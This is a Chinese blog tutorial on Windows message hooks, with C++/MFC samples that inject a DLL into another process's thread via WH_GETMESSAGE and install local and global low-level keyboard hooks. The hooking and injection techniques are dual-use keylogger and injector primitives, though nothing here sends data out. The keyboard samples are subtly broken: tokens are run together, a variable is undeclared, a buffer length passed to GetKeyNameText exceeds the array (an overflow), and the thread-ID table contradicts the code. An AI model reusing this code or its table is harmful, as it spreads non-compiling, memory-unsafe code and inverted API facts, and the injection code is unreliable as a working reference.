<p>主要用到的WindowsAPI</p>
<blockquote>
<p>头文件    Winuser.h (include Windows.h)<br>库文件    User32.lib<br>DLL文件    User32.dll</p>
</blockquote>
<h5 id="SetWindowsHookEx"><a href="#SetWindowsHookEx" class="headerlink" title="SetWindowsHookEx"></a>SetWindowsHookEx</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HHOOK WINAPI <span class="title">SetWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ <span class="keyword">int</span>       idHook,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ HOOKPROC  lpfn,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ HINSTANCE hMod,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ DWORD     dwThreadId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>其中 <strong>idHook</strong> 可选的值有很多种, 更多选项可以到 MSDN <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990(v=vs.85).aspx</a> 查看<br>本文用到其中的 <strong>WH_GETMESSAGE</strong> 监视发送到消息队列的消息</p>
<h5 id="GetMsgProc"><a href="#GetMsgProc" class="headerlink" title="GetMsgProc"></a>GetMsgProc</h5><p>其 <code>_In_ HOOKPROC lpfn,</code> 对应的回调函数如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">GetMsgProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ <span class="keyword">int</span>    code,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>lParam</strong> 参数可以转换为 <strong>MSG*</strong>结构体<br><code>MSG* pMsg = (MSG*)lParam;</code></p>
<h5 id="CallNextHookEx"><a href="#CallNextHookEx" class="headerlink" title="CallNextHookEx"></a>CallNextHookEx</h5><p>这个函数起到传递下一个钩子函数的作用,这样的话,其他钩子才可以继续执行</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">LRESULT WINAPI <span class="title">CallNextHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_ HHOOK  hhk,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_     <span class="keyword">int</span>    nCode,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_     WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_     LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>nCode,wParam,lParam</strong> 一般都是 <strong>GetMsgProc</strong> 中的参数<br>,而 <strong>hhk</strong> 则为 <strong>SetWindowsHookEx</strong> 返回的钩子句柄.</p>
<h5 id="UnhookWindowsHookEx"><a href="#UnhookWindowsHookEx" class="headerlink" title="UnhookWindowsHookEx"></a>UnhookWindowsHookEx</h5><p>卸载钩子,与 <code>SetWindowsHookEx</code> 成对使用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">UnhookWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ HHOOK hhk</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>下面以一个简单例子说明(<strong>MFC</strong>)</p>
<p>Source.def文件，用于导出DLL函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">LIBRARY 	hookFun.dll	;dll名</span><br><span class="line">EXPORTS						;导出函数</span><br><span class="line">SetHook		@<span class="number">1</span></span><br><span class="line">UnsetHook	@<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>DLL模块文件</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_EXPORT extern <span class="meta-string">"C"</span> __declspec(dllexport)</span></span><br><span class="line"><span class="comment">//开始HOOK</span></span><br><span class="line"><span class="function">DLL_EXPORT <span class="keyword">void</span> _stdcall <span class="title">SetHook</span><span class="params">(DWORD pid)</span></span>;</span><br><span class="line"><span class="comment">//取消HOOK</span></span><br><span class="line"><span class="function">DLL_EXPORT <span class="keyword">void</span> _stdcall <span class="title">UnsetHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//全局 钩子句柄</span></span><br><span class="line">HHOOK hHook_g = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//全局 DLL模块句柄</span></span><br><span class="line">HINSTANCE hInstance_g = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//DLL 入口函数</span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(_In_ <span class="keyword">void</span>* _DllHandle, _In_ <span class="keyword">unsigned</span> <span class="keyword">long</span> _Reason, _In_opt_ <span class="keyword">void</span>* _Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (_Reason==DLL_PROCESS_ATTACH)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//保存当前 DLL模块的句柄到全局，以后要用！</span></span><br><span class="line">		hInstance_g = (HINSTANCE)_DllHandle;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//自定义消息，处理钩子消息函数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WM_HOOKMSG WM_USER+100 </span></span><br><span class="line"><span class="comment">//过程消息处理函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">GetMsgProc</span><span class="params">(_In_ <span class="keyword">int</span>    code,_In_ WPARAM wParam,_In_ LPARAM lParam)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">	<span class="comment">//把 参数 lParam 转换为 MSG 结构体，获取 消息类型</span></span><br><span class="line">	MSG* pMsg = (MSG*)lParam;</span><br><span class="line">	<span class="keyword">if</span> (pMsg-&gt;message== WM_HOOKMSG)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBoxA(<span class="literal">NULL</span>, <span class="string">"HOOK MSG"</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//继续传递下一个钩子</span></span><br><span class="line">	<span class="keyword">return</span> CallNextHookEx(hHook_g, code, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//开始HOOK，这里过于简单，没有进行其他处理...(-｡-;)</span></span><br><span class="line"><span class="comment">//参数--&gt; 线程ID </span></span><br><span class="line"><span class="function">DLL_EXPORT <span class="keyword">void</span> _stdcall <span class="title">SetHook</span><span class="params">(DWORD tid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//安装钩子</span></span><br><span class="line">	<span class="comment">//hInstance_g：标识 GetMsgProc 在 该模块内</span></span><br><span class="line">	<span class="comment">//tid：				标识是 全局钩子( tid=0 ) 还是指定 线程钩子</span></span><br><span class="line">	hHook_g = SetWindowsHookExW(WH_GETMESSAGE, GetMsgProc, hInstance_g, tid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//取消HOOK</span></span><br><span class="line"><span class="function">DLL_EXPORT <span class="keyword">void</span> _stdcall <span class="title">UnsetHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//卸载钩子</span></span><br><span class="line">	UnhookWindowsHookEx(hHook_g);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用进程主要代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//自定义消息</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  WM_HOOKMSG WM_USER+100</span></span><br><span class="line"><span class="comment">//路径</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  DLL_PATH <span class="meta-string">L"C:\\hookFun.dll"</span></span></span><br><span class="line"><span class="comment">//SetHook 函数地址</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(_stdcall* LPFNSETHOOK)</span><span class="params">(DWORD)</span></span>;</span><br><span class="line"><span class="comment">//UnsetHook 函数地址</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(_stdcall* LPFNUNSETHOOK)</span><span class="params">()</span></span>;</span><br><span class="line">HMODULE hMo = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ChookMfcDlg::OnBnClickedButton1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//获取指定主窗口的句柄</span></span><br><span class="line">	HWND hwndMain = ::FindWindow(<span class="literal">NULL</span>, <span class="string">L"剪贴簿查看器 - [剪贴板]"</span>);</span><br><span class="line">	<span class="comment">//保存 进程ID</span></span><br><span class="line">	DWORD PID;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">char</span> szMsg[<span class="number">50</span>]=&#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//返回 线程ID</span></span><br><span class="line">	 DWORD TID= GetWindowThreadProcessId(hwndMain, &amp;PID);</span><br><span class="line">	 <span class="built_in">sprintf</span>(szMsg, <span class="string">"Thread ID:%08X"</span>, TID);</span><br><span class="line">	 MessageBoxA(<span class="literal">NULL</span>, szMsg, szMsg, MB_ICONINFORMATION);</span><br><span class="line">	 <span class="comment">//先动态载入 要注入的DLL，然后再把它卸载！！！</span></span><br><span class="line">	 hMo= LoadLibrary(DLL_PATH);</span><br><span class="line">	<span class="comment">//获取模块内 SetHook 函数地址</span></span><br><span class="line">	LPFNSETHOOK lpSethook = (LPFNSETHOOK)GetProcAddress(hMo, <span class="string">"SetHook"</span>);</span><br><span class="line">	<span class="comment">//调用SetHook函数</span></span><br><span class="line">	lpSethook(TID);</span><br><span class="line">	<span class="comment">//向 要注入的 进程的线程ID 投递 我自己消息</span></span><br><span class="line">	PostThreadMessageW(TID, WM_HOOKMSG, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="comment">//获取模块内 UnsetHook 函数地址</span></span><br><span class="line">	LPFNUNSETHOOK lpUnSethook = (LPFNUNSETHOOK)GetProcAddress(hMo, <span class="string">"UnsetHook"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ChookMfcDlg::OnBnClickedButton2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//获取模块内 UnsetHook 函数地址</span></span><br><span class="line">	LPFNUNSETHOOK lpUnSethook = (LPFNUNSETHOOK)GetProcAddress(hMo, <span class="string">"UnsetHook"</span>);</span><br><span class="line">	<span class="comment">// 取消HOOK！</span></span><br><span class="line">	lpUnSethook();</span><br><span class="line">	<span class="comment">//把 主调用进程  的 DLL 卸载，不然会一直存在主调用进程中！！</span></span><br><span class="line">	FreeLibrary(hMo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一般来说,注入DLL这项技术确实很老了,注入时可能会失败.so …</p>
<h4 id="键盘HOOK"><a href="#键盘HOOK" class="headerlink" title="键盘HOOK"></a>键盘HOOK</h4><p>这个例子没有用到DLL,直接勾住当前程序</p>
<ul>
<li>KeyboardProc —- <strong>WH_KEYBOARD(2)</strong></li>
<li>LowLevelKeyboardProc —- <strong>WH_KEYBOARD_LL(13)</strong></li>
</ul>
<p>注意 上面的 <strong>KeyboardProc</strong> 和 <strong>LowLevelKeyboardProc</strong> 函数，前者是<strong>普通</strong>的钩子函数，而后者是一个<strong>低级</strong>的钩子函数，这两个函数的参数不同，所以要获取的值也不同！！</p>
<blockquote>
<p><strong>wParam</strong> [in]<br>Type: <strong>WPARAM</strong><br><strong>The virtual-key code of the key</strong> thatgenerated the keystroke message.<br><strong>lParam</strong> [in]<br>Type: <strong>LPARAM</strong><br>The repeat count, scan code, extended-key flag, contextcode, previous key-state flag, and transition-state flag. For more informationabout thelParam parameter, seeKeystroke Message Flags. The following table describes the bits of this value.<br><strong>由此可看出 ，wparam主要是键盘的虚拟键代码，lparam主要是：</strong><br>The lParam parameter of a keystroke message containsadditional information about the keystroke that generated the message. Thisinformation includes therepeat count, the scan code, the extended-key flag, thecontext code, the previous key-state flag, and the transition-state flag.The following illustration shows the locations of these flags and values in thelParam parameter.</p>
</blockquote>
<p>当 <strong>SetWindowsHookEx()</strong> 参数 <strong>idHOOK</strong> 为 <strong>WH_KEYBORAD_LL</strong> 时，这个函数的参数中的 <strong>wparam</strong> 为 <strong>键盘消息</strong> ，如WM_KEYDOMN… 那么 <strong>lparam</strong> 就是一个 <strong>LPKBDLLHOOKSTRUCT结构体</strong> 了！看这个结构体的名字就知道这是一个用于 低级键盘钩子的，“LL”-&gt;”LowLevel“，呵呵~这个结构体中 包括了 <strong>虚拟键代码 和 扫描码</strong>!</p>
<p>别忘了还有那个 SetWindowsHookEx() 函数，现在在回忆一下那个函数原型：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HHOOK WINAPI <span class="title">SetWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ <span class="keyword">int</span>       idHook,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ HOOKPROC  lpfn,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ HINSTANCE hMod,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ DWORD    dwThreadId</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>当<strong>IdHook为WH_KEYBOARD</strong>时，lpfn为KeyboardProc(名字自定义)，<strong>hMod为当前程序实例句柄</strong>，MFC 有多种方法获取，如: <code>AfxGetInstanceHandle()</code><br>最后一个 <strong>dwThreadId为0</strong></p>
</li>
<li><p>当idHook为WH_KEYBOARD_LL时，dwThreadid必须为当前模块的线程ID！<br>如下表:</p>
<table>
<thead>
<tr>
<th>idHook</th>
<th>lpfn</th>
<th>hMod</th>
<th>dwThreadId</th>
</tr>
</thead>
<tbody><tr>
<td>WH_KEYBOARD</td>
<td>KeyboardProc</td>
<td>当前程序实例句柄</td>
<td>0</td>
</tr>
<tr>
<td>WH_KEYBOARD_LL</td>
<td>LowLevelKeyboardProc</td>
<td>当前程序实例句柄</td>
<td>当前程序线程ID</td>
</tr>
</tbody></table>
</li>
</ul>
<p>代码如下:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">HHOOK hHook2;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyBoradProc</span><span class="params">(intcode,WPARAMwp,LPARAMlp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (code&lt;<span class="number">0</span>)</span><br><span class="line">         &#123;</span><br><span class="line">                   <span class="keyword">return</span> CallNextHookEx(hHook2,code,wp, lp);</span><br><span class="line">         &#125;</span><br><span class="line">         WCHAR szkeyValue[<span class="number">20</span>]=&#123; <span class="number">0</span> &#125;;</span><br><span class="line">         <span class="comment">//wsprintf(szkeyValue, L"%c", wp);  //虚拟键代码</span></span><br><span class="line">            <span class="comment">//获取按键的名称          </span></span><br><span class="line">         GetKeyNameText(lp,szkeyValue, <span class="number">50</span>);</span><br><span class="line">         AfxGetMainWnd()-&gt;SetDlgItemText(IDC_EDIT1,szkeyValue);</span><br><span class="line">         <span class="keyword">return</span> CallNextHookEx(hHook2,code,wp, lp);</span><br><span class="line">&#125;</span><br><span class="line">       <span class="comment">//安装键盘钩子</span></span><br><span class="line">         hHook2 = SetWindowsHookEx(WH_KEYBOARD,KeyBoradProc,AfxGetInstanceHandle(),GetCurrentThreadId());      <span class="comment">//注意这里的线程ID为当前程序的线程ID！</span></span><br><span class="line">      </span><br><span class="line">         <span class="comment">//卸载钩子</span></span><br><span class="line">UnhookWindowsHookEx(hHook2);</span><br><span class="line">下面是关于低级键盘钩子的代码；</span><br><span class="line">         <span class="comment">//低级的键盘钩子</span></span><br><span class="line">         hHook= ::SetWindowsHookEx(WH_KEYBOARD_LL,myLowLevelKeyboardProc,AfxGetInstanceHandle(),<span class="number">0</span>);<span class="comment">//注意这里TID为 0</span></span><br><span class="line"> </span><br><span class="line">         <span class="comment">//卸载低级钩子</span></span><br><span class="line">UnhookWindowsHookEx(hHook)</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//低级钩子函数处理过程</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">LowLevelKeyboardProc</span><span class="params">(_In_int   code,_In_WPARAMwParam,_In_LPARAMlParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">                   <span class="keyword">if</span> (code &lt; <span class="number">0</span>)</span><br><span class="line">                   &#123;</span><br><span class="line">                            returnCallNextHookEx(hHook,code,wParam, lParam);</span><br><span class="line">                   &#125;</span><br><span class="line"> </span><br><span class="line">                  <span class="comment">// 低级键盘钩子时，wparam参数为 WM键盘消息！！！</span></span><br><span class="line"> </span><br><span class="line">                   <span class="comment">//按下的</span></span><br><span class="line">                   <span class="keyword">if</span> (code ==HC_ACTION&amp;&amp;wParam==WM_KEYDOWN)</span><br><span class="line">                   &#123;</span><br><span class="line">                            LPKBDLLHOOKSTRUCTpKbs = (LPKBDLLHOOKSTRUCT)lParam;</span><br><span class="line">                            WCHARszlMsg[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">                            wsprintf(szMsg,<span class="string">L"vkCode:%c-scanCode:%02X"</span>,pKbs-&gt;vkCode,pKbs-&gt;scanCode);</span><br><span class="line"> </span><br><span class="line">							<span class="comment">//ESC键扫描码</span></span><br><span class="line">                            <span class="keyword">if</span> (pKbs-&gt;scanCode==<span class="number">0x01</span>)</span><br><span class="line">                            &#123;                         </span><br><span class="line">                                     returnTRUE;</span><br><span class="line">                            &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">                   <span class="keyword">return</span> CallNextHookEx(hHook,code,wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>C</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
</search>
